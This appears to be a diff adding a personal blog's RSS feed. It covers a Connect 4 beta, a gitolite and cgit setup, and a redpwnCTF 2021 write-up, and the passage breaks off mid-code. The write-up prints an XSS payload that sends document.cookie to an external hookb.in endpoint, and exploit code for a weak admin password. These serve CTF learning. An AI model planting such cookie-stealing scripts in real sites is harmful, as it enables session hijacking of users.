@@ -1,0 +1,4403 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+  <channel>
+    <title>Loek's excruciatingly interesting blog</title>
+    <description>This is where I post updates on things that I do</description>
+    <language>en-us</language>
+    <link>https://blog.pipeframe.xyz/atom.xml</link>
+    <atom:link href="https://blog.pipeframe.xyz/atom.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Connect 4 beta live!</title>
+      <guid>connect4</guid>
+      <link>/post/connect4</link>
+      <pubDate>April 24 2021</pubDate>
+      <description>&lt;div class="contentWrapper"&gt;
+ &lt;p&gt;
+  My connect four website is currently online as a public beta. You can visit the
+website at
+  &lt;a href="https://connect4.pipeframe.xyz"&gt;
+   https://connect4.pipeframe.xyz
+  &lt;/a&gt;
+  . A list of known bugs is on the
+homepage, and all other issues should be submitted to
+  &lt;a href="https://github.com/lonkaars/connect-4/issues"&gt;
+   GitHub
+  &lt;/a&gt;
+  .
+ &lt;/p&gt;
+ &lt;p&gt;
+  If I encounter some very interesing bug that I think deserves it's own blog
+post I'll write one about it of course. I have one more week from now to worry
+about the connect four website, but after that I'm going to start preparing for
+my school exams.
+ &lt;/p&gt;
+&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>My git setup</title>
+      <guid>git</guid>
+      <link>/post/git</link>
+      <pubDate>April 28 2021</pubDate>
+      <description>&lt;div class="contentWrapper"&gt;
+ &lt;h2 id="overview"&gt;
+  Overview
+ &lt;/h2&gt;
+ &lt;p&gt;
+  I have two mechanisms set up for accessing my git server. I use gitolite for
+ssh access and permission management. I also have cgit set up which generates
+html pages for viewing your repositories and also hosts your repositories over
+http, or https if you have it set up.
+ &lt;/p&gt;
+ &lt;h2 id="ssh-access-with-gitolite"&gt;
+  SSH Access with gitolite
+ &lt;/h2&gt;
+ &lt;p&gt;
+  Gitolite was a pain in the ass to set up because I didn't understand umasks
+before I started trying to set it up. A
+  &lt;em&gt;
+   umask
+  &lt;/em&gt;
+  is like the opposite of what
+you'd enter when running
+  &lt;code&gt;
+   chmod
+  &lt;/code&gt;
+  . For example: if I run
+  &lt;code&gt;
+   touch test
+  &lt;/code&gt;
+  , I will
+now have a file with the same permissions as
+  &lt;code&gt;
+   chmod 644
+  &lt;/code&gt;
+  . That looks something
+like this:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-sh" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     $ touch test
+    &lt;/span&gt;
+    $ ls -l
+    &lt;!-- --&gt;
+    total bla bla
+    &lt;!-- --&gt;
+    -rw-r--r--  1 loek users 0 Apr 28 12:28 test
+    &lt;!-- --&gt;
+    $ chmod 644 test
+    &lt;!-- --&gt;
+    $ ls -l
+    &lt;!-- --&gt;
+    total bla bla
+    &lt;!-- --&gt;
+    -rw-r--r--  1 loek users 0 Apr 28 12:28 test
+    &lt;!-- --&gt;
+    $ # notice the same permissions on the 'test' file
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  If I want gitolite to create repositories with default permissions so other
+users can read the repositories, I have to set my umask to the opposite of 644.
+Here's a quick explanation of
+  &lt;code&gt;
+   ls -l
+  &lt;/code&gt;
+  's output:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-sh" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     -rw-r--r-- * user group size date time filename
+    &lt;/span&gt;
+    |└┬┘└┬┘└┬┘
+    &lt;!-- --&gt;
+    | |  |  └all users
+    &lt;!-- --&gt;
+    | |  └owner group
+    &lt;!-- --&gt;
+    | └owner user
+    &lt;!-- --&gt;
+    └type
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Each digit in a
+  &lt;code&gt;
+   chmod
+  &lt;/code&gt;
+  command sets the permission for the file owner, file
+group, then everyone. That looks something like this:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-sh" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     $ chmod 644 test
+    &lt;/span&gt;
+    &lt;!-- --&gt;
+    decimal:  6   4   4
+    &lt;!-- --&gt;
+    binary:   110 100 100
+    &lt;!-- --&gt;
+    ls -l:  - rw- r-- r--
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Then we take the opposite of this to get the umask:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-sh" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     $ chmod 755 directory -R
+    &lt;/span&gt;
+    &lt;!-- --&gt;
+    ls -l:  d rwx r-x r-x
+    &lt;!-- --&gt;
+    binary:   000 010 010
+    &lt;!-- --&gt;
+    decimal:  0   2   2
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  And now my
+  &lt;code&gt;
+   .gitolite.rc
+  &lt;/code&gt;
+  :
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-perl" style="white-space:pre"&gt;
+    &lt;span class="token variable"&gt;
+     %RC
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     UMASK
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0022
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     ROLES
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     READERS
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     1
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     WRITERS
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     1
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     ENABLE
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'ssh-authkeys'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'git-config'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'daemon'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'gitweb'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     1
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;h2 id="https-access-with-cgit"&gt;
+  HTTP(S) Access with cgit
+ &lt;/h2&gt;
+ &lt;p&gt;
+  Cgit is probably the easiest thing to set up. It has great built-in
+documentation (
+  &lt;code&gt;
+   man 5 cgitrc
+  &lt;/code&gt;
+  ). Pretty much all configuration is in
+  &lt;code&gt;
+   /etc/cgitrc
+  &lt;/code&gt;
+  (css/syntax highlighting isn't in there). The only reason I'm
+posting my config here is because for some reason, the order of the options in
+cgit's config matters:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-rc" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     #
+    &lt;/span&gt;
+    # cgit config
+    &lt;!-- --&gt;
+    # see cgitrc(5) for details
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    cache-size=0
+    &lt;!-- --&gt;
+    enable-commit-graph=1
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    css=/cgit.css
+    &lt;!-- --&gt;
+    logo=/cgit.png
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    virtual-root=/
+    &lt;!-- --&gt;
+    remove-suffix=1
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    root-title=git :tada:
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    ##
+    &lt;!-- --&gt;
+    ## List of common mimetypes
+    &lt;!-- --&gt;
+    ##
+    &lt;!-- --&gt;
+    mimetype.gif=image/gif
+    &lt;!-- --&gt;
+    mimetype.html=text/html
+    &lt;!-- --&gt;
+    mimetype.jpg=image/jpeg
+    &lt;!-- --&gt;
+    mimetype.jpeg=image/jpeg
+    &lt;!-- --&gt;
+    mimetype.pdf=application/pdf
+    &lt;!-- --&gt;
+    mimetype.png=image/png
+    &lt;!-- --&gt;
+    mimetype.svg=image/svg+xml
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    # Highlight source code with python pygments-based highlighter
+    &lt;!-- --&gt;
+    source-filter=/usr/lib/cgit/filters/syntax-highlighting.py
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    # Format markdown, restructuredtext, manpages, text files, and html files
+    &lt;!-- --&gt;
+    # through the right converters
+    &lt;!-- --&gt;
+    about-filter=/usr/lib/cgit/filters/about-formatting.sh
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    ##
+    &lt;!-- --&gt;
+    ## Search for these files in the root of the default branch of repositories
+    &lt;!-- --&gt;
+    ## for coming up with the about page:
+    &lt;!-- --&gt;
+    ##
+    &lt;!-- --&gt;
+    readme=:README.md
+    &lt;!-- --&gt;
+    readme=:readme.md
+    &lt;!-- --&gt;
+    readme=:README.rst
+    &lt;!-- --&gt;
+    readme=:readme.rst
+    &lt;!-- --&gt;
+    readme=:README.txt
+    &lt;!-- --&gt;
+    readme=:readme.txt
+    &lt;!-- --&gt;
+    readme=:README
+    &lt;!-- --&gt;
+    readme=:readme
+    &lt;!-- --&gt;
+    readme=:INSTALL.md
+    &lt;!-- --&gt;
+    readme=:install.md
+    &lt;!-- --&gt;
+    readme=:INSTALL.mkd
+    &lt;!-- --&gt;
+    readme=:install.mkd
+    &lt;!-- --&gt;
+    readme=:INSTALL.rst
+    &lt;!-- --&gt;
+    readme=:install.rst
+    &lt;!-- --&gt;
+    readme=:INSTALL.html
+    &lt;!-- --&gt;
+    readme=:install.html
+    &lt;!-- --&gt;
+    readme=:INSTALL.htm
+    &lt;!-- --&gt;
+    readme=:install.htm
+    &lt;!-- --&gt;
+    readme=:INSTALL.txt
+    &lt;!-- --&gt;
+    readme=:install.txt
+    &lt;!-- --&gt;
+    readme=:INSTALL
+    &lt;!-- --&gt;
+    readme=:install
+    &lt;!-- --&gt;
+    &lt;!-- --&gt;
+    scan-path=/mnt/scf/git/repositories
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>Loek's excruciatingly interesting blog</title>
+      <guid>index</guid>
+      <link>/post/index</link>
+      <pubDate>April 12 2021</pubDate>
+      <description>&lt;div class="contentWrapper"&gt;
+ &lt;p&gt;
+  Welcome to my blog page! This is where I post updates on things that I do such
+as:
+ &lt;/p&gt;
+ &lt;ul&gt;
+  &lt;li&gt;
+   Cool open source software that I think you should use
+  &lt;/li&gt;
+  &lt;li&gt;
+   How to set up self-hosted applications
+  &lt;/li&gt;
+  &lt;li&gt;
+   Rants about Microsoft Windows
+  &lt;/li&gt;
+  &lt;li&gt;
+   Maybe some recipes I dunno
+  &lt;/li&gt;
+ &lt;/ul&gt;
+ &lt;p&gt;
+  The page you're looking at right now is also open-source! The code for this
+page can be found on
+  &lt;a href="https://github.com/lonkaars/blog"&gt;
+   GitHub
+  &lt;/a&gt;
+  , and should
+also be available on
+  &lt;a href="https://git.pipeframe.xyz"&gt;
+   my private git server
+  &lt;/a&gt;
+  .
+ &lt;/p&gt;
+&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>redpwnCTF 2021</title>
+      <guid>redpwn2021</guid>
+      <link>/post/redpwn2021</link>
+      <pubDate>July 13 2021</pubDate>
+      <description>&lt;div class="contentWrapper"&gt;
+ &lt;p&gt;
+  This is the first 'real' CTF I've participated in. About two weeks ago, a
+friend of mine was stuck on some challenges from the Radboud CTF. This was a
+closed CTF more geared towards beginners (high school students), and only had a
+few challenges which required deeper technical knowledge of web servers and
+programming. Willem solved most of the challenges, and I helped solve 3 more.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Apart from those challenges, basically all my hacking knowledge comes from
+computerphile videos, liveoverflow videos and making applications myself.
+ &lt;/p&gt;
+ &lt;h2 id="challenges"&gt;
+  Challenges
+ &lt;/h2&gt;
+ &lt;h3 id="webpastebin-1"&gt;
+  web/pastebin-1
+ &lt;/h3&gt;
+ &lt;p&gt;
+  This challenge is a simple XSS exploit. The website that's vulnerable is
+supposed to be a clone of pastebin. I can enter any text into the paste area,
+and it will get inserted as HTML code into the website when someone visits the
+generated link.
+ &lt;/p&gt;
+ &lt;p&gt;
+  The challenge has two sites: one with the pastebin clone, and one that visits
+any pastebin url as the website administrator. The goal of this challenge is
+given by it's description:
+ &lt;/p&gt;
+ &lt;blockquote&gt;
+  &lt;p&gt;
+   Ah, the classic pastebin. Can you get the admin's cookies?
+  &lt;/p&gt;
+ &lt;/blockquote&gt;
+ &lt;p&gt;
+  In JS, you can read all cookies without the
+  &lt;code&gt;
+   HttpOnly
+  &lt;/code&gt;
+  attribute by reading
+  &lt;code&gt;
+   document.cookie
+  &lt;/code&gt;
+  . This allows us to read the cookies from the admin's browser,
+but now we have to figure out a way to get them sent back to us.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Luckily, there's a free service called
+  &lt;a href="https://hookbin.com/"&gt;
+   hookbin
+  &lt;/a&gt;
+  that
+gives you an http endpoint to send anything to, and look at the request
+details.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Combining these two a simple paste can be created:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-html" style="white-space:pre"&gt;
+    &lt;span class="token tag punctuation"&gt;
+     &lt;
+    &lt;/span&gt;
+    &lt;span class="token tag"&gt;
+     script
+    &lt;/span&gt;
+    &lt;span class="token tag punctuation"&gt;
+     &gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript keyword"&gt;
+     var
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+     post
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript keyword"&gt;
+     new
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript class-name"&gt;
+     XMLHttpRequest
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+     post
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript method function property-access"&gt;
+     open
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript string"&gt;
+     "post"
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript string"&gt;
+     "https://hookb.in/&lt;endpoint url&gt;"
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+     post
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript method function property-access"&gt;
+     send
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript dom variable"&gt;
+     document
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript property-access"&gt;
+     cookie
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token script language-javascript"&gt;
+    &lt;/span&gt;
+    &lt;span class="token tag punctuation"&gt;
+     &lt;/
+    &lt;/span&gt;
+    &lt;span class="token tag"&gt;
+     script
+    &lt;/span&gt;
+    &lt;span class="token tag punctuation"&gt;
+     &gt;
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;h3 id="cryptoscissor"&gt;
+  crypto/scissor
+ &lt;/h3&gt;
+ &lt;p&gt;
+  I wasn't planning on including this one, but it makes use of the excellent
+  &lt;a href="https://gchq.github.io/CyberChef/"&gt;
+   CyberChef
+  &lt;/a&gt;
+  tool. The flag is given in the
+challenge description, and is encrypted using a ceasar/rot13 cipher. A simple
+python implementation of this cypher is included with the challenge, but I just
+put it into CyberChef and started trying different offsets.
+ &lt;/p&gt;
+ &lt;h3 id="revwstrings"&gt;
+  rev/wstrings
+ &lt;/h3&gt;
+ &lt;blockquote&gt;
+  &lt;p&gt;
+   Some strings are wider than normal...
+  &lt;/p&gt;
+ &lt;/blockquote&gt;
+ &lt;p&gt;
+  This challenge has a binary that uses a simple
+  &lt;code&gt;
+   strcmp
+  &lt;/code&gt;
+  to check the flag. When
+running the program, the following output is visible:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-sh" style="white-space:pre"&gt;
+    &lt;span class=""&gt;
+     # ./wstrings
+    &lt;/span&gt;
+    Welcome to flag checker 1.0.
+    &lt;!-- --&gt;
+    Give me a flag&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  My first stategy was running the
+  &lt;code&gt;
+   strings
+  &lt;/code&gt;
+  utility on the
+  &lt;code&gt;
+   wstrings
+  &lt;/code&gt;
+  binary,
+but I didn't find the flag. What was interesting to me though was that I also
+couldn't find the prompt text... This immediately made me check for other
+string encodings.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Running the
+  &lt;code&gt;
+   strings
+  &lt;/code&gt;
+  utility with the
+  &lt;code&gt;
+   -eL
+  &lt;/code&gt;
+  flag tells
+  &lt;code&gt;
+   strings
+  &lt;/code&gt;
+  to look for
+32-bit little-endian encoded strings, and lo and behold the flag shows up!
+ &lt;/p&gt;
+ &lt;p&gt;
+  This is because ascii strings are less 'wide' than 32-bit strings:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   --- ascii ---
+
+hex -&gt; 0x68 0x65 0x6c 0x6c 0x6f
+str -&gt; h    e    l    l    o
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Notice how each character is represented by a single byte each (8 bits) in
+ascii, as opposed to 32-bit characters in 32-bit land.
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   --- 32-bit land ---
+
+hex -&gt; 0x00000068 0x00000065 0x0000006c 0x0000006c 0x0000006f
+str -&gt; h          e          l          l          o
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  I think 32-bit strings also have practical use for things like non-english
+texts such as hebrew, chinese or japanese. Those characters take up more space
+anyways, and you would waste less space by not using unicode escape characters.
+ &lt;/p&gt;
+ &lt;h3 id="websecure"&gt;
+  web/secure
+ &lt;/h3&gt;
+ &lt;blockquote&gt;
+  &lt;p&gt;
+   Just learned about encryption—now, my website is unhackable!
+  &lt;/p&gt;
+ &lt;/blockquote&gt;
+ &lt;p&gt;
+  This challenge is pretty simple if you know some of JS's quirks. Right at the
+top of the file is an sqlite3 expression in JS:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-js" style="white-space:pre"&gt;
+    &lt;span class="token comment"&gt;
+     ////////
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     db
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token method function property-access"&gt;
+     exec
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token template-string template-punctuation string"&gt;
+     `
+    &lt;/span&gt;
+    &lt;span class="token template-string string"&gt;
+     INSERT INTO users (username, password) VALUES (
+    &lt;/span&gt;
+    &lt;span class="token template-string string"&gt;
+     '
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation interpolation-punctuation punctuation"&gt;
+     ${
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation function"&gt;
+     btoa
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation string"&gt;
+     'admin'
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation interpolation-punctuation punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class="token template-string string"&gt;
+     ',
+    &lt;/span&gt;
+    &lt;span class="token template-string string"&gt;
+     '
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation interpolation-punctuation punctuation"&gt;
+     ${
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation function"&gt;
+     btoa
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation"&gt;
+     crypto
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation property-access"&gt;
+     randomUUID
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token template-string interpolation interpolation-punctuation punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class="token template-string string"&gt;
+     '
+    &lt;/span&gt;
+    &lt;span class="token template-string string"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token template-string template-punctuation string"&gt;
+     `
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  This section of code immediately jumped out to me because I noticed that
+  &lt;code&gt;
+   crypto.randomUUID
+  &lt;/code&gt;
+  wansn't actually being called.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Because the 'random uuid' is being fed into
+  &lt;code&gt;
+   btoa()
+  &lt;/code&gt;
+  it becomes a base64
+encoded string. However,
+  &lt;code&gt;
+   btoa()
+  &lt;/code&gt;
+  also expects a string as input. Because every
+object in JS has a
+  &lt;code&gt;
+   .toString()
+  &lt;/code&gt;
+  method, when you pass it into a function
+expecting another type, JS will happily convert it for you without warning.
+ &lt;/p&gt;
+ &lt;p&gt;
+  This means that the admin's password will always be a base64-encoded version of
+  &lt;code&gt;
+   crypto.randomUUID
+  &lt;/code&gt;
+  's source code. We can get that base64-encoded source code
+by running the following in a NodeJS REPL:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-js" style="white-space:pre"&gt;
+    &lt;span class="token comment"&gt;
+     // import file system and crypto modules
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     var
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     writeFileSync
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     require
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'fs'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class="token property-access"&gt;
+     writeFileSync
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     var
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     crypto
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     require
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'crypto'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     // write source to file
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     writeFileSync
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     './randomUUID.js'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     btoa
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     crypto
+    &lt;/span&gt;
